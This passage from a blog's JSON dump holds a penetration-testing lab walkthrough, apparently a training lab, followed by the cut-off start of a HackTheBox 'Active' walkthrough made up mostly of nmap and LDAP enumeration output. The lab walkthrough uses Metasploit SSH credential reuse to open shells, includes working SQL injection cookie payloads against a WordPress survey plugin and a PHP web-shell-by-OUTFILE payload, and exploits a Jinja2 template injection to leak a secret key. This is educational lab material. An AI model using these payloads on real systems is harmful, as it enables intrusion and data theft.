5BEiBBtrNq695A!6u5zUR5KxC  no        A specific password to authenticate with   PASS_FILE                                    no        File containing passwords, one per line   RHOSTS            file:/root/sshhosts.txt    yes       The target address range or CIDR identifier   RPORT             22                         yes       The target port   STOP_ON_SUCCESS   false                      yes       Stop guessing when a credential works for a host   THREADS           1                          yes       The number of concurrent threads   USERNAME          sviridov@test.lab          no        A specific username to authenticate as   USERPASS_FILE                                no        File containing users and passwords separated by space, one pair per line   USER_AS_PASS      false                      no        Try the username as the password for all users   USER_FILE                                    no        File containing usernames, one per line   VERBOSE           false                      yes       Whether to print output for all attemptsmsf5 auxiliary(scanner/ssh/ssh_login) &gt; run[+] 192.168.0.10:22 - Success: 'sviridov@test.lab:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\\users) Linux info 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '[*] Command shell session 1 opened (10.12.0.10:40079 -&gt; 192.168.0.10:22) at 2019-05-06 06:17:03 -0400[*] Scanned 1 of 6 hosts (16% complete)[*] Scanned 2 of 6 hosts (33% complete)[*] Scanned 3 of 6 hosts (50% complete)[*] Scanned 4 of 6 hosts (66% complete)[*] Scanned 5 of 6 hosts (83% complete)[*] Scanned 6 of 6 hosts (100% complete)[*] Auxiliary module execution completedmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set USERNAME sviridovUSERNAME =&gt; sviridovmsf5 auxiliary(scanner/ssh/ssh_login) &gt; run[+] 192.168.0.10:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\\users) Linux info 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '[*] Command shell session 2 opened (10.12.0.10:44971 -&gt; 192.168.0.10:22) at 2019-05-06 06:18:57 -0400[*] Scanned 1 of 6 hosts (16% complete)[+] 192.168.0.15:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\\users) Linux sidorov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '[*] Command shell session 3 opened (10.12.0.10:42259 -&gt; 192.168.0.15:22) at 2019-05-06 06:19:00 -0400[*] Scanned 2 of 6 hosts (33% complete)[+] 192.168.0.30:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\\users) Linux petrov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '[*] Command shell session 4 opened (10.12.0.10:34513 -&gt; 192.168.0.30:22) at 2019-05-06 06:19:03 -0400[*] Scanned 3 of 6 hosts (50% complete)[+] 192.168.0.100:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\\users) Linux lomonosov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '[*] Command shell session 5 opened (10.12.0.10:32987 -&gt; 192.168.0.100:22) at 2019-05-06 06:19:06 -0400[*] Scanned 4 of 6 hosts (66% complete)[*] Scanned 5 of 6 hosts (83% complete)[+] 192.168.0.240:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\\users) Linux sviridov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '[*] Command shell session 6 opened (10.12.0.10:42965 -&gt; 192.168.0.240:22) at 2019-05-06 06:19:11 -0400[*] Scanned 6 of 6 hosts (100% complete)[*] Auxiliary module execution completedmsf5 auxiliary(scanner/ssh/ssh_login) &gt; The sviridov user credentials can be used to login to multiple servers. Searching the servers gives you information regarding other users of network info,lomonosov,petrov,sidorov and sviridov.On the 192.168.0.100 server, access to the sidorov user’s home directory was possible and this directory cotained the Users token.root@kali:~# ssh sviridov@192.168.0.100sviridov@192.168.0.100's password:  Warning: Your password will expire in 852 days on Sat Sep  4 18:48:18 2021Linux lomonosov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64Last login: Mon May  6 13:18:41 2019 from 10.12.0.10##########################PasswordAuthentication yes##########################sviridov@lomonosov:~$ ls -latotal 8dr-x------ 2 sviridov root 4096 Dec 13 20:21 .drwxr-xr-x 7 root     root 4096 Dec 13 20:21 ..sviridov@lomonosov:~$ cd ../sviridov@lomonosov:/home/TEST$ lsinfo  lomonosov  petrov  sidorov  sviridovsviridov@lomonosov:/home/TEST$ cd sidorov/sviridov@lomonosov:/home/TEST/sidorov$ ls -latotal 12dr-x---r-x 2 sidorov  root 4096 Dec 13 20:42 .drwxr-xr-x 7 root     root 4096 Dec 13 20:21 ..-r-x------ 1 sviridov root   23 Dec 13 20:40 .tokensviridov@lomonosov:/home/TEST/sidorov$ cat .token FGui83OIHFG80tuy38rfnysviridov@lomonosov:/home/TEST/sidorov$ Site TokenPrevious enumeration of the DNS server successfully identified the IP address of the site application to be 172.16.0.10. This application hosted a WordPress CMS system that was identified during the beginnning this network. However, exploitation of this application was not possible due to a web application firewall in place. However, if you browse the application IP address directly after VPNing as the Sidorov user to the 172.16.0.0/16 subnet, the WAF can be bypassed. An Nmap scan of the 172.16.0.0/16 range identified a HTTP service running on port 80 on the IP address 172.16.0.14. It can be assumed that this is the direct IP address of the WordPress system.WPScan can be run again to identify outdated plugins and themes: wpscan –url http://site.test.lab –random-user-agentLooking through the scan results, the following result could be intersting.[+] wp-survey-and-poll | Location: http://site.test.lab/wp-content/plugins/wp-survey-and-poll/ | Last Updated: 2019-01-17T15:32:00.000Z | [!] The version is out of date, the latest version is 1.5.8.1 | | Detected By: Urls In Homepage (Passive Detection) | | Version: 1.5.7.8 (50% confidence) | Detected By: Readme - ChangeLog Section (Aggressive Detection) |  - http://site.test.lab/wp-content/plugins/wp-survey-and-poll/readme.txtPrevious exploitation of this plugin using the SQL Injection exploit found from exploit-db (https://www.exploit-db.com/exploits/45411) was not possible. Retest of this vulnerability resulted in successful exploitation.By modifying the ‘wp_sap’ cookie set by the plugin, it can be modified to a SQL Injection payload as specified by the exploit-db information. An example of this can be seen below. Cookie: wp_sap=[\"1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11 #\"]When injected, the @@version function will return information regarding the underlying database software.The database() function can be used to find the current database that the application is interacting with.By querying the information_schema database, a list of all tables avaiable on the MySQL can be identified.   Cookie: wp_sap=[\"1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,table_name,11 from information_schema.tables #\"]   var sss_params = {\"survey_options\":\"{\\\"options\\\":\\\"[\\\\\\\"bottom\\\\\\\",\\\\\\\"easeInOutBack\\\\\\\",\\\\\\\"\\\\\\\",\\\\\\\"linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -o-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -ms-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -moz-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -webkit-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%);\\\\\\\",\\\\\\\"rgb(81, 81, 81)\\\\\\\",\\\\\\\"rgb(188, 188, 188)\\\\\\\",\\\\\\\"1\\\\\\\",\\\\\\\"5\\\\\\\",\\\\\\\"20\\\\\\\",\\\\\\\"20\\\\\\\",\\\\\\\"20\\\\\\\",1000,\\\\\\\"So, mr. Hacker, the die is cast.\\\\\\\",\\\\\\\"0\\\\\\\",\\\\\\\"1\\\\\\\",\\\\\\\"0\\\\\\\"]\\\",\\\"plugin_url\\\":\\\"http:\\\\\\/\\\\\\/site.test.lab\\\\\\/wp-content\\\\\\/plugins\\\\\\/wp-survey-and-poll\\\",\\\"admin_url\\\":\\\"http:\\\\\\/\\\\\\/site.test.lab\\\\\\/wp-admin\\\\\\/admin-ajax.php\\\",\\\"survey_id\\\":\\\"242178939\\\",\\\"style\\\":\\\"modal\\\",\\\"expired\\\":\\\"false\\\",\\\"debug\\\":\\\"true\\\",\\\"questions\\\":[[\\\"Ready to show who is mr. Hacker?\\\",\\\"Yes\\\",\\\"No\\\"],[\\\"ALL_PLUGINS\\\"],[\\\"APPLICABLE_ROLES\\\"],[\\\"CHARACTER_SETS\\\"],[\\\"COLLATIONS\\\"],[\\\"COLLATION_CHARACTER_SET_APPLICABILITY\\\"],[\\\"COLUMNS\\\"],[\\\"COLUMN_PRIVILEGES\\\"],[\\\"ENABLED_ROLES\\\"],[\\\"ENGINES\\\"],[\\\"EVENTS\\\"],[\\\"FILES\\\"],[\\\"GLOBAL_STATUS\\\"],[\\\"GLOBAL_VARIABLES\\\"],[\\\"KEY_CACHES\\\"],[\\\"KEY_COLUMN_USAGE\\\"],[\\\"PARAMETERS\\\"],[\\\"PARTITIONS\\\"],[\\\"PLUGINS\\\"],[\\\"PROCESSLIST\\\"],[\\\"PROFILING\\\"],[\\\"REFERENTIAL_CONSTRAINTS\\\"],[\\\"ROUTINES\\\"],[\\\"SCHEMATA\\\"],[\\\"SCHEMA_PRIVILEGES\\\"],[\\\"SESSION_STATUS\\\"],[\\\"SESSION_VARIABLES\\\"],[\\\"STATISTICS\\\"],[\\\"SYSTEM_VARIABLES\\\"],[\\\"TABLES\\\"],[\\\"TABLESPACES\\\"],[\\\"TABLE_CONSTRAINTS\\\"],[\\\"TABLE_PRIVILEGES\\\"],[\\\"TRIGGERS\\\"],[\\\"USER_PRIVILEGES\\\"],[\\\"VIEWS\\\"],[\\\"GEOMETRY_COLUMNS\\\"],[\\\"SPATIAL_REF_SYS\\\"],[\\\"CLIENT_STATISTICS\\\"],[\\\"INDEX_STATISTICS\\\"],[\\\"INNODB_SYS_DATAFILES\\\"],[\\\"TABLE_STATISTICS\\\"],[\\\"INNODB_SYS_TABLESTATS\\\"],[\\\"USER_STATISTICS\\\"],[\\\"INNODB_SYS_INDEXES\\\"],[\\\"XTRADB_RSEG\\\"],[\\\"INNODB_CMP_PER_INDEX\\\"],[\\\"INNODB_TRX\\\"],[\\\"CHANGED_PAGE_BITMAPS\\\"],[\\\"INNODB_FT_BEING_DELETED\\\"],[\\\"INNODB_LOCK_WAITS\\\"],[\\\"INNODB_LOCKS\\\"],[\\\"INNODB_TABLESPACES_ENCRYPTION\\\"],[\\\"XTRADB_INTERNAL_HASH_TABLES\\\"],[\\\"INNODB_SYS_FIELDS\\\"],[\\\"INNODB_CMPMEM_RESET\\\"],[\\\"INNODB_CMP\\\"],[\\\"INNODB_FT_INDEX_TABLE\\\"],[\\\"INNODB_SYS_TABLESPACES\\\"],[\\\"INNODB_MUTEXES\\\"],[\\\"INNODB_BUFFER_PAGE_LRU\\\"],[\\\"INNODB_SYS_FOREIGN_COLS\\\"],[\\\"INNODB_CMP_RESET\\\"],[\\\"INNODB_BUFFER_POOL_STATS\\\"],[\\\"INNODB_FT_INDEX_CACHE\\\"],[\\\"INNODB_SYS_FOREIGN\\\"],[\\\"INNODB_METRICS\\\"],[\\\"INNODB_FT_DEFAULT_STOPWORD\\\"],[\\\"INNODB_CMPMEM\\\"],[\\\"INNODB_SYS_TABLES\\\"],[\\\"INNODB_SYS_COLUMNS\\\"],[\\\"INNODB_FT_CONFIG\\\"],[\\\"INNODB_BUFFER_PAGE\\\"],[\\\"INNODB_CMP_PER_INDEX_RESET\\\"],[\\\"XTRADB_READ_VIEW\\\"],[\\\"INNODB_SYS_SEMAPHORE_WAITS\\\"],[\\\"INNODB_CHANGED_PAGES\\\"],[\\\"INNODB_FT_DELETED\\\"],[\\\"INNODB_TABLESPACES_SCRUBBING\\\"],[\\\"token\\\"],[\\\"wp_commentmeta\\\"],[\\\"wp_comments\\\"],[\\\"wp_links\\\"],[\\\"wp_options\\\"],[\\\"wp_postmeta\\\"],[\\\"wp_posts\\\"],[\\\"wp_term_relationships\\\"],[\\\"wp_term_taxonomy\\\"],[\\\"wp_termmeta\\\"],[\\\"wp_terms\\\"],[\\\"wp_usermeta\\\"],[\\\"wp_users\\\"],[\\\"wp_wp_sap_answers\\\"],[\\\"wp_wp_sap_questions\\\"],[\\\"wp_wp_sap_surveys\\\"]]}\"}By looking at the above output, the table “token” stands out. Any columns belonging to this table can be identified using the below SQL Injection payload.Cookie: wp_sap=[\"1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,column_name,11 from information_schema.columns where table_name = 'token'#\"]This gives us information regarding a column called “name” existing within the “token” table. var sss_params = {\"survey_options\":\"{\\\"options\\\":\\\"[\\\\\\\"bottom\\\\\\\",\\\\\\\"easeInOutBack\\\\\\\",\\\\\\\"\\\\\\\",\\\\\\\"linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -o-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -ms-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -moz-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -webkit-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%);\\\\\\\",\\\\\\\"rgb(81, 81, 81)\\\\\\\",\\\\\\\"rgb(188, 188, 188)\\\\\\\",\\\\\\\"1\\\\\\\",\\\\\\\"5\\\\\\\",\\\\\\\"20\\\\\\\",\\\\\\\"20\\\\\\\",\\\\\\\"20\\\\\\\",1000,\\\\\\\"So, mr. Hacker, the die is cast.\\\\\\\",\\\\\\\"0\\\\\\\",\\\\\\\"1\\\\\\\",\\\\\\\"0\\\\\\\"]\\\",\\\"plugin_url\\\":\\\"http:\\\\\\/\\\\\\/site.test.lab\\\\\\/wp-content\\\\\\/plugins\\\\\\/wp-survey-and-poll\\\",\\\"admin_url\\\":\\\"http:\\\\\\/\\\\\\/site.test.lab\\\\\\/wp-admin\\\\\\/admin-ajax.php\\\",\\\"survey_id\\\":\\\"242178939\\\",\\\"style\\\":\\\"modal\\\",\\\"expired\\\":\\\"false\\\",\\\"debug\\\":\\\"true\\\",\\\"questions\\\":[[\\\"Ready to show who is mr. Hacker?\\\",\\\"Yes\\\",\\\"No\\\"],[\\\"name\\\"]]}\"};This column can now be queried directly to find the Site token.Other payloads such as §UNION ALL SELECT 1,&lt;?php echo shell_exec($_GET[‘cmd’])?&gt;,3,4,5,6,7,8,9,10,11 into OUTFILE ‘/var/www/shell.php’ #§ was tried to possibly execute code on the system through SQL Injection. But, this was found to be not possible.My TokenLooking at the previously obtained DNS names from the DNS token, the following IP address corresponds to my.test.lab.my.test.lab.\t\t21600\tIN\tA\t172.16.0.10A quick nmap reveals a web server to be present on port 80.root@kali:~/Downloads# nmap -sS -n 172.16.0.10Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-09 18:14 EDTNmap scan report for 172.16.0.10Host is up (0.060s latency).Not shown: 999 filtered portsPORT   STATE SERVICE80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 12.30 secondsroot@kali:~/Downloads# Visiting the webserver using a web browser shows the following login page.It was possible to login to this web application using the previously found ‘info’ user credentials with the password ‘123456789’.After examining the page, it looks like the application is vulnerable to Server Side Template Injection (SSTI). Server Side Template Injection is possible when an attacker can inject template directive as user input that can execute arbitrary code on the server. Some popular and widely used template engines are Smarty, Twig, Jinja2, FreeMarker, Velocity. More information regarding this vulnerability can be found here: https://portswigger.net/blog/server-side-template-injectionPresence of this vulnerability can be successfully identified by inserting a payload such as {\\{1 * 2\\}} which evaluates to 22.The tool tplmap was used to quickly exploit this vulnerability however that was found to be not possible.root@kali:~/tplmap# ./tplmap.py -u 'http://my.test.lab/?q=kk'[+] Tplmap 0.5    Automatic Server-Side Template Injection Detection and Exploitation Tool[+] Testing if GET parameter 'q' is injectable[+] Smarty plugin is testing rendering with tag *[+] Smarty plugin is testing blind injection[+] Dot plugin is testing blind injection[+] Dust plugin is testing rendering[+] Dust plugin is testing blind injection[+] Marko plugin is testing rendering with tag [+] Marko plugin is testing blind injection[+] Javascript plugin is testing rendering with tag '*'[+] Javascript plugin is testing blind injection[+] Php plugin is testing rendering with tag [+] Php plugin is testing blind injection[+] Ruby plugin is testing rendering with tag [+] Ruby plugin is testing blind injection[+] Ejs plugin is testing rendering with tag '*'[+] Ejs plugin is testing blind injection[!][checks] Tested parameters appear to be not injectableAfter looking through tplmap’s source code and by reading through the great methodology given by James Kettle of Portswigger (https://portswigger.net/blog/server-side-template-injection), the following can be done to identify what template is in use.By following the above methodology, it is possible to identify that the template in use in Jinja2 since it evaluates {7*‘7’}} to 7777777.Knowing that, enumeration of the application can now begin. The following global variables are available within Jinja2 templates by default:  config - the current configuration object  request - the current request object  session - the current session object  g - the request-bound object for global variables. This is usually used by the developer to store resources during a request.The configuration object can be called to retrieve the secret key used by the Jinja template. The Secret Key ‘UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==’ is the My token.Reverse TokenExamining the file downloaded from repository.test.lab, it looks to be an executable.root@kali:~/Downloads# file binbin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=119ea32cf92d114f4c938989562717e2451414d9, not strippedroot@kali:~/Downloads# strings bin/lib64/ld-linux-x86-64.so.2libc.so.6__isoc99_scanfputsprintf__cxa_finalize__libc_start_main_ITM_deregisterTMCloneTable__gmon_start___Jv_RegisterClasses_ITM_registerTMCloneTableGLIBC_2.7GLIBC_2.2.5AWAVAAUATL[]A\\A]A^A_PASSWORD: %32sACCESS GRANTED!ACCESS DENIED!;*3$\"qk0Q5ZmS3au5RkcPuyotTjtg3G0bux3rQn8AiYpfA4rPUrL9Oxn1ET5vG8h7o7xba1aX9SLLbe3Fksvqtv7YhRoqtaw91ezunFb4dqPjHNnUoGJhC9u7gBdb9YWyCBxLHNnwB0GQNeVL5CGzMWjpuKfxDfqVPb1K3Z95TWpP8AjUCROxVRWwdciYZeALUOdXs9ZYhZfC1QJ648ks4T2osoLzdFizYgTNiAp6GHesRyGqYFR2nrI6eVsRBCg8wwuCkheitdX7MaAJUmiUcCKyRY8S3OCL6EYUZGu3qyV3h0SjtvcXydEFkDAY614ag0WzQm0WDrht1fHYMCwNJMX7JzyJZgs4uT44fMbNVxtoCJPmqaioEFrCNCAqUJJey5t59gnkzkuM7bp3nYaqneAL5PErwSZoDdHRpDCZ4rifJzZbXC3JCcdG8VXm4sb2dUHgcmHunusgo6mLm1k2mECv4twf9NFotmh0SH09vwZGljB1gBuxiEEWBVAyoEtMMfwHAWBbrLGVxIxW3SwxdLzGaJtwnTPkS0CIBEE08jI0dF1WwDZZjTMS3wnR8gn1Yl0P2wI2d3MAhcASlc7Jh3glOlRzHsCP6aYGPRkuaCnSV6PvKZR69c6ZdZmmSXcJhXaIfV3Z3hTeDSkDcB3tA6ErgkfACczshjOkRG2UK0t01h6Iu1mYoYNMwaDYOFLDdKbbh5RsV2d5xxvva4hNQCKAeImgyYv2VGsnU2UBCWM6LMfjTrPViCvE2iCoy2HFGlZu1E0kpCL4HsvT08R7MS1b7QOHmGjPRjej5rHeHjWfheNpO6fOcRKo8UaBIYy5Elmm9hNjolVactGp6W2ANee4x3TqQbhomXDCjxV1ieQfSW7jJBcBCNeEDy0tN0WKUzkXZQ6jg2CvZYAIr5jJUqoPBoKmgKEvbc2JbPnjBvCFSJOWjZQ4YTt8yl9Qg2iZ4BjCgamRgM6VyyM9UyvaigVutUkAo9xWcUmbzAICHvw3womkL80wKKeJG5nbkQR0ziw7GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.6972__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrycrme.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTableputs@@GLIBC_2.2.5_edataprintf@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_initcheck_pw__bss_startmain_Jv_RegisterClasses__isoc99_scanf@@GLIBC_2.7__TMC_END___ITM_registerTMCloneTable__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.commentBinary Ninja can be used to disassemble the binary and understand it better. Looking at the disassembled binary in graph view, it is expecting user input as a value password and is executing a function called check_pw and depending on the output and if the user value and password matches, they are sent to the correct branch.Looking at the check_pw function, the comparison of the user value and password value can be seen.The JE (Jump Equal) function can be modified to JNE (Jump not Equal) to match the condition to be true even if a wrong password is provided.Running the binary again, the access is granted however a token is not provided.Since the condition of this executable is based on a simple compare function, symbolic execution could be used to grant access to this binary. Symbolic execution (also symbolic evaluation) is a means of analyzing a program to determine what inputs cause each part of a program to execute. angr can be used to solve this. angr is a binary analysis platform written by the Computer Security Lab at UC Santa Barbara, SEFCOM at Arizona State University, and their associated CTF team, Shellphish for CTFs.Looking at angr documentation https://docs.angr.io/core-concepts/pathgroups, the following code can be used on the executableimport angrproject = angr.Project(\"./bin\")simgr = project.factory.simgr()simgr.explore(find=lamda s: b\"ACCESS GRANTED!\" in s.posix.dumps(1)s = simgr.found[0]print(s.posix.dumps(0))By running the Simulation manager, the “ACCESS GRANTED” state can be achieved and the reverse token can be obtained."
  },
  
  {
    "title": "HackTheBox : Active Walkthrough",
    "url": "/posts/htb-active-walkthrough/",
    "categories": "network security",
    "tags": "htb",
    "date": "2018-12-29 03:25:52 +0800",
    





    
    "snippet": "This walkthrough is a guide on how to exploit HTB Active machine. A quick nmap scan of the target system reveals the following information. The arguement -p- can also be used to scan the entire por...",
    "content": "This walkthrough is a guide on how to exploit HTB Active machine. A quick nmap scan of the target system reveals the following information. The arguement -p- can also be used to scan the entire port range upto 65536root@kali:~/Downloads# nmap -sV 10.10.10.100 -n -sC -Pn -vvvStarting Nmap 7.70 ( https://nmap.org ) at 2019-06-21 16:23 EDTNSE: Loaded 148 scripts for scanning.NSE: Script Pre-scanning.Initiating NSE at 16:26Completed NSE at 16:26, 0.29s elapsedNmap scan report for 10.10.10.100Host is up, received user-set (0.055s latency).Scanned at 2019-06-21 16:23:12 EDT for 215sNot shown: 983 closed portsReason: 983 resetsPORT      STATE SERVICE       REASON          VERSION53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid: |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2019-06-21 20:17:10Z)135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp   open  microsoft-ds? syn-ack ttl 127464/tcp   open  kpasswd5?     syn-ack ttl 127593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0636/tcp   open  tcpwrapped    syn-ack ttl 1273268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (c)3269/tcp  open  tcpwrapped    syn-ack ttl 12749152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.049158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -6m20s, deviation: 0s, median: -6m20s| p2p-conficker: |   Checking for Conficker.C or higher...|   Check 1 (port 8052/tcp): CLEAN (Couldn't connect)|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)|   Check 3 (port 20043/udp): CLEAN (Timeout)|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)|_  0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-security-mode: |   2.02: |_    Message signing enabled and required| smb2-time: |   date: 2019-06-21 16:18:12|_  start_date: 2019-06-21 07:26:26NSE: Script Post-scanning.NSE: Starting runlevel 1 (of 2) scan.Initiating NSE at 16:26Completed NSE at 16:26, 0.00s elapsedNSE: Starting runlevel 2 (of 2) scan.Initiating NSE at 16:26Completed NSE at 16:26, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 214.99 seconds           Raw packets sent: 1344 (59.136KB) | Rcvd: 1001 (40.108KB)Looking at the provided LDAP information, it can be deduced that DNS name for this machine is active.htb. This can be added to your hosts file. It is also obvious that by the services open such as DNS, LDAP and Kerberos, this is a domain controller.LDAP EnumerationSince LDAP is open, enumeration can be conduced on this service.oot@kali:~/Downloads# nmap -p 389 --script ldap-rootdse active.htbStarting Nmap 7.70 ( https://nmap.org ) at 2019-06-22 16:58 EDTNmap scan report for active.htb (10.10.10.100)Host is up (0.057s latency).PORT    STATE SERVICE389/tcp open  ldap| ldap-rootdse: | LDAP Results|   &lt;ROOT&gt;|       currentTime: 20190622205142.0Z|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=active,DC=htb|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb|       namingContexts: DC=active,DC=htb|       namingContexts: CN=Configuration,DC=active,DC=htb|       namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb|       namingContexts: DC=DomainDnsZones,DC=active,DC=htb|       namingContexts: DC=ForestDnsZones,DC=active,DC=htb|       defaultNamingContext: DC=active,DC=htb|       schemaNamingContext: CN=Schema,CN=Configuration,DC=active,DC=htb|       configurationNamingContext: CN=Configuration,DC=active,DC=htb|       rootDomainNamingContext: DC=active,DC=htb|       supportedControl: 1.2.840.113556.1.4.319|       supportedControl: 1.2.840.113556.1.4.801|       supportedControl: 1.2.840.113556.1.4.473|       supportedControl: 1.2.840.113556.1.4.528|       supportedControl: 1.2.840.113556.1.4.417|       supportedControl: 1.2.840.113556.1.4.619|       supportedControl: 1.2.840.113556.1.4.841|       supportedControl: 1.2.840.113556.1.4.529|       supportedControl: 1.2.840.113556.1.4.805|       supportedControl: 1.2.840.113556.1.4.521|       supportedControl: 1.2.840.113556.1.4.970|       supportedControl: 1.2.840.113556.1.4.1338|       supportedControl: 1.2.840.113556.1.4.474|       supportedControl: 1.2.840.113556.1.4.1339|       supportedControl: 1.2.840.113556.1.4.1340|       supportedControl: 1.2.840.113556.1.4.1413|       supportedControl: 2.16.840.1.113730.3.4.9|       supportedControl: 2.16.840.1.113730.3.4.10|       supportedControl: 1.2.840.113556.1.4.1504|       supportedControl: 1.2.840.113556.1.4.1852|       supportedControl: 1.2.840.113556.1.4.802|       supportedControl: 1.2.840.113556.1.4.1907|       supportedControl: 1.2.840.113556.1.4.1948|       supportedControl: 1.2.840.113556.1.4.1974|       supportedControl: 1.2.840.113556.1.4.1341|       supportedControl: 1.2.840.113556.1.4.2026|       supportedControl: 1.2.840.113556.1.4.2064|       supportedControl: 1.2.840.113556.1.4.2065|       supportedControl: 1.2.840.113556.1.4.2066|       supportedLDAPVersion: 3|       supportedLDAPVersion: 2|       supportedLDAPPolicies: MaxPoolThreads|       supportedLDAPPolicies: MaxDatagramRecv|       supportedLDAPPolicies: MaxReceiveBuffer|       supportedLDAPPolicies: InitRecvTimeout|       supportedLDAPPolicies: MaxConnections|       supportedLDAPPolicies: MaxConnIdleTime|       supportedLDAPPolicies: MaxPageSize|       supportedLDAPPolicies: MaxQueryDuration|       supportedLDAPPolicies: MaxTempTableSize|       supportedLDAPPolicies: MaxResultSetSize|       supportedLDAPPolicies: MinResultSets|       supportedLDAPPolicies: MaxResultSetsPerConn|       supportedLDAPPolicies: MaxNotificationPerConn|       supportedLDAPPolicies: MaxValRange|       supportedLDAPPolicies: ThreadMemoryLimit|       supportedLDAPPolicies: SystemMemoryLimitPercent|       highestCommittedUSN: 90299|       supportedSASLMechanisms: GSSAPI|       supportedSASLMechanisms: GSS-SPNEGO|       supportedSASLMechanisms: EXTERNAL|       supportedSASLMechanisms: DIGEST-MD5|       dnsHostName: DC.active.htb|       ldapServiceName: active.htb:dc$@ACTIVE.HTB|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb|       supportedCapabilities: 1.2.840.113556.1.4.800|       supportedCapabilities: 1.2.840.113556.1.4.1670|       supportedCapabilities: 1.2.840.113556.1.4.1791|       supportedCapabilities: 1.2.840.113556.1.4.1935|       supportedCapabilities: 1.2.840.113556.1.4.2080|       isSynchronized: 